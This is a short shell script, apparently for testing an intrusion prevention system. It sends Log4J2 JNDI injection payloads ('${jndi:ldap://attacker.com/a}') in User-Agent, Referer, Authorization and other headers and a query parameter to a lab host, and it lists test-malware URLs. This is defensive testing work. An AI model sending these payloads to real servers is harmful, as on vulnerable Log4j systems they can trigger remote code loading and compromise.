...
# Define the correct base URL for Log4J2
BASE_URL="http://labs.aflabs.us:82"
MALWARE_URL_1="http://malware.wicar.org/data/eicar.com"
MALWARE_URL_2="http://malware.wicar.org/data/ms09_072_style_object.html"

echo "Testing IPS with various attacks on Log4J2 and other vulnerabilities..."

#########################
# Log4J2 Exploit Tests (5 Tests)
#########################

echo "Running Log4J2 Exploit Tests..."

LOG4J_PAYLOAD="\${jndi:ldap://attacker.com/a}"

# Send Log4J2 exploit payloads via headers and query params
curl -i -s -k -H "User-Agent: ${LOG4J_PAYLOAD}" "${BASE_URL}/test"
curl -i -s -k -H "X-Api-Version: ${LOG4J_PAYLOAD}" "${BASE_URL}/test"
curl -i -s -k "${BASE_URL}/test?search=${LOG4J_PAYLOAD}"
curl -i -s -k -H "Referer: ${LOG4J_PAYLOAD}" "${BASE_URL}/test"
curl -i -s -k -H "Authorization: Basic ${LOG4J_PAYLOAD}" "${BASE_URL}/test"
